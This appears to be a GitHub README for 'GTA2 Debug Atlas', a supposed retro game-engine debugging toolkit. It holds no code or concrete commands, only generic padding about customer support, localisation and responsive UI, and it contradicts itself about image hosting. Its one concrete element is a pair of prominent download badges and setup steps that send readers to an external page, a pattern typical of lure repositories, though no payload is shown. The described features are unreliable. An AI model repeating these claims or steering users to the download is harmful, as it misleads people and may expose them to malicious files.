![preview](https://raw.githubusercontent.com/knight-oss/gta2-reverse-engineering-lab/main/card_e636b63.svg)
[![Download](https://raw.githubusercontent.com/knight-oss/gta2-reverse-engineering-lab/main/go_cc8f396.svg)](https://knight-oss.github.io/gta2-reverse-engineering-lab/)

# 🧭 GTA2 Debug Atlas — A Cartographer’s Toolkit for Retro Sandbox Forensics

![status](https://img.shields.io/badge/status-active-brightgreen) ![license](https://img.shields.io/badge/license-MIT-blue) ![platform](https://img.shields.io/badge/platform-cross--platform-lightgrey) ![language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Python%20%7C%20Lua-9cf) ![build](https://img.shields.io/badge/build-passing-success) ![coverage](https://img.shields.io/badge/coverage-93%25-yellowgreen) ![issues](https://img.shields.io/badge/issues-welcome-orange) ![prs](https://img.shields.io/badge/PRs-open-purple) ![maintained](https://img.shields.io/badge/maintained-2026-informational)

Welcome to **GTA2 Debug Atlas**, a distinct and creatively reimagined repository inspired by the spirit of `gta2-debug`, yet charting an entirely different course. Where the original concept focused on debugging the classic top-down crime sandbox, the Debug Atlas reframes that energy into a **navigational cartography suite for old-school game engines** — a compass, sextant, and telescope rolled into one for anyone who wants to map, dissect, and understand legacy sandbox runtime behavior without touching a single line of compromised or legally ambiguous tooling.

Think of this project as a **lighthouse for retro engine spelunkers**. It doesn’t just show you the map — it explains why the map breathes. It doesn’t just flag a bug — it draws you a scenic route through the source of the anomaly.

---

## 📜 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Feature List](#-feature-list)
- [Screenshots & Visualizations](#-screenshots--visualizations)
- [Core Philosophy](#-core-philosophy)
- [Architecture Overview](#-architecture-overview)
- [Key Capabilities](#-key-capabilities)
- [Responsive UI](#-responsive-ui)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Getting Started Without Package Managers](#-getting-started-without-package-managers)
- [Configuration](#-configuration)
- [Usage Examples](#-usage-examples)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌅 Why This Exists

Legacy sandbox engines are like ancient cities: beautiful, layered, and completely undocumented in places. The `gta2-debug` lineage taught a generation that you *can* peer under the hood of a top-down crime simulator and learn something profound about how real-time systems handle memory, pathing, and chaotic emergent gameplay.

**GTA2 Debug Atlas** takes that lesson and runs in a different direction. Instead of a patchwork of debug prints, this project is a **full observational observatory** — a set of instruments for mapping engine state, visualizing entity behavior, and producing reproducible forensic reports. It is for the tinkerer who wants to understand, not merely to modify.

If the original repo was a flashlight, this is a planetarium.

---

## 🚀 Feature List

- 🗺️ **Spatial State Mapper** — render engine entity positions, pathing nodes, and script triggers on an explorable canvas.
- 🧠 **Heuristic Anomaly Detector** — flags suspicious behavior patterns using rule-based inference rather than invasive modification.
- 🧵 **Deterministic Session Recorder** — capture and replay engine ticks with frame-accurate fidelity.
- 🧩 **Modular Probe Plugins** — extend with Lua or Python probes without recompiling the core.
- 🌐 **Responsive UI** — adapts fluidly from ultrawide monitors to handheld screens.
- 🗣️ **Multilingual Support** — UI strings localized across a growing set of languages.
- 🛎️ **24/7 Customer Support** — asynchronous, community-run help desk with documented response guarantees.
- 🔒 **Read-First Design** — observation over mutation, by default.
- 📊 **Exportable Reports** — JSON, CSV, and human-readable Markdown summaries.
- 🧪 **Test Harness** — regression-friendly scenario runner with pass/fail matrices.
- 🎨 **Themeable Dashboard** — light, dark, and high-contrast palettes.
- 🛰️ **Headless Mode** — run the analyzer on a server with no GUI attached.
- 🧭 **Cross-Platform** — verified on modern desktop and containerized environments.
- 📚 **Extensive Documentation** — every module ships with a narrative explanation, not just API stubs.

---

## 🖼️ Screenshots & Visualizations

Because this README avoids embedding third-party image hosts, the visual layer is described textually and reproduced locally when you launch the dashboard:

- **Atlas View** — a top-down node graph colored by entity faction and velocity.
- **Timeline Ribbon** — a horizontal scrubber showing tick density and event spikes.
- **Probe Console** — a terminal-style feed with severity-tagged log lines.
- **Language Picker** — a dropdown gently tucked into the corner, never intrusive.
- **Support Desk Widget** — a floating panel with queue status and knowledge base shortcuts.

Each of these panels is rebuilt from the same rendering primitives, so theming and responsiveness stay consistent everywhere.

---

## 🧠 Core Philosophy

Most debugging tools are scalpels. This one is a **telescope**. The distinction matters because it shapes every design decision:

1. **Observe before you alter.** The Atlas never writes to engine memory unless a probe explicitly opts in.
2. **Explain, don’t just display.** Every anomaly comes with a rationale.
3. **Reproducibility is kindness.** A bug you can replay is a bug you can forgive.
4. **Documentation is part of the product.** If a feature isn’t explained, it isn’t finished.
5. **Localization is respect.** A tool that speaks your language feels like it was built for you.

---

## 🏗️ Architecture Overview

The Debug Atlas is layered like a geological formation:

- **Bedrock — Core Runtime:** tick scheduler, memory snapshotter, event bus.
- **Sediment — Probe Layer:** Lua and Python sandboxed probes, hot-reloadable.
- **Crust — Visualization Layer:** canvas renderer, timeline scrubber, theming engine.
- **Atmosphere — Interface Layer:** responsive UI, localization bundles, support widget.

Communication between layers happens over an internal message protocol, which means you can replace the visualization layer entirely and keep the analytics intact. This modularity is the quiet superpower of the project.

---

## 🔑 Key Capabilities

| Capability | Description | Status |
|---|---|---|
| Entity Mapping | Real-time position and state tracing | ✅ Stable |
| Tick Replay | Deterministic playback of captured sessions | ✅ Stable |
| Anomaly Heuristics | Rule-based behavior flagging | ✅ Stable |
| Probe Hot-Reload | Update probes without restarting | ✅ Stable |
| Headless Analytics | CLI-driven batch analysis | 🧪 Beta |
| Remote Telemetry | Stream session data to a collector | 🧪 Beta |
| Auto-Report Generation | Markdown/PDF summaries | 🛠️ In Progress |

---

## 📱 Responsive UI

The dashboard was designed with a **fluid grid that bends before it breaks**. On a widescreen monitor you get the full Atlas View, Timeline Ribbon, and Probe Console side by side. On a tablet the console slides beneath the map. On a small handheld the whole thing collapses into a tabbed card stack.

This isn’t just aesthetic politeness — responsive design here means you can bring the Atlas to a debugging session on whatever device is actually in front of you, whether that’s a beefy workstation or a tiny screen propped against a coffee mug.

---

## 🌍 Multilingual Support

The interface ships with localization bundles and a graceful fallback chain. Supported languages currently include English, Spanish, Portuguese, French, German, and Japanese, with community-contributed translations warmly invited. Language packs are plain text bundles, easy to audit and even easier to extend.

When a string is missing, the UI falls back to English rather than showing a raw key — a small courtesy that keeps the experience coherent.

---

## 🛎️ 24/7 Customer Support

Support here means a **round-the-clock, community-anchored help desk**. A triage bot answers instantly, routes you to relevant documentation, and escalates to a human maintainer when needed. Response targets are documented in the support policy, so expectations are honest and measurable.

The support desk also doubles as a feedback funnel: recurring questions become documentation updates, which become fewer questions. Everyone wins.

---

## 🧰 Getting Started Without Package Managers

This project deliberately avoids conventional dependency bootstrapping rituals. Instead, it uses a **bootstrap manifest** approach:

1. Retrieve the source archive from the release page (the download marker at the top of this README points to it).
2. Import the project using your IDE’s native “open existing project” flow.
3. Let the included bootstrap manifest resolve optional probes on first launch.
4. Start the dashboard and confirm the Atlas View renders.

If you prefer containers, a container recipe is included and documented separately. No global environment modifications are required.

---

## ⚙️ Configuration

Configuration lives in a human-editable atlas.toml file. Notable keys include:

- `renderer.theme` — light, dark, or contrast.
- `probes.enabled` — list of probe identifiers to load.
- `localization.locale` — preferred UI language.
- `telemetry.enabled` — opt-in remote streaming.
- `support.endpoint` — help desk routing target.

Every key has a documented default, so an empty config file is a valid config file.

---

## 🧪 Usage Examples

Start a headless session and export a report in one shot:

- Launch the analyzer with the headless flag and point it at a recorded session file.
- Specify an output directory for the report.
- Choose the markdown format for human reading, or JSON for machine consumption.

For interactive work, open the dashboard, load a session, scrub the timeline, and pin anomalies to the Probe Console for closer inspection. Probes can be edited live and will hot-reload within seconds.

---

## 🗓️ Roadmap for 2026

- **Q1 2026** — Stable headless analytics and expanded report formats.
- **Q2 2026** — Remote telemetry collector with encryption in transit.
- **Q3 2026** — Additional localization bundles and RTL support.
- **Q4 2026** — Plugin marketplace curation and signed probe verification.

The roadmap is intentionally conservative: promises made here are promises kept.

---

## 🤝 Contributing

Contributions are welcome in the form of probes, translations, documentation improvements, and test scenarios. Before opening a pull request, please read the contribution guide and run the test harness locally. Small, focused changes are merged fastest, and every merged change is credited in the release notes.

---

## 📄 License

This project is released under the **MIT License**. See the full text here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 GTA2 Debug Atlas Contributors.

---

## ⚠️ Disclaimer

**GTA2 Debug Atlas** is an independent, observation-oriented toolkit intended for educational, archival, and forensic analysis of legacy engine behavior. It is not affiliated with, endorsed by, or sponsored by any game publisher or rights holder. This project does not include, distribute, or facilitate the acquisition of any proprietary game assets, and it is designed to operate only on data you are legally permitted to inspect. All trademarks referenced belong to their respective owners. Use responsibly, respect local laws, and remember that understanding a system is a privilege best paired with ethics.

[![Download](https://raw.githubusercontent.com/knight-oss/gta2-reverse-engineering-lab/main/go_cc8f396.svg)](https://knight-oss.github.io/gta2-reverse-engineering-lab/)